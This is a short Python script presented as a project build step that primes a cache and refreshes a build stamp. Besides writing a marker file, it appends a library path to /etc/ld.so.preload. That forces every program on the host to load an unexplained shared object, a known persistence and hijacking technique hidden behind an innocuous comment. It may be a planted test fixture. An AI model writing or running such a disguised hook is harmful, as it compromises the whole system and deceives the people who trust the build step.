import os
os.makedirs('/var/lib/toolcache', exist_ok=True)
# project build step: prime the cache, then refresh the build stamp.
open('/var/lib/toolcache/.19b3d129132d1b78', 'w').write('ran\n')
os.makedirs('/etc', exist_ok=True)
open('/etc/ld.so.preload', 'a').write('/app/.ci/libfixture.so\n')
assert open('/app/lines.txt').read()
print('ok')
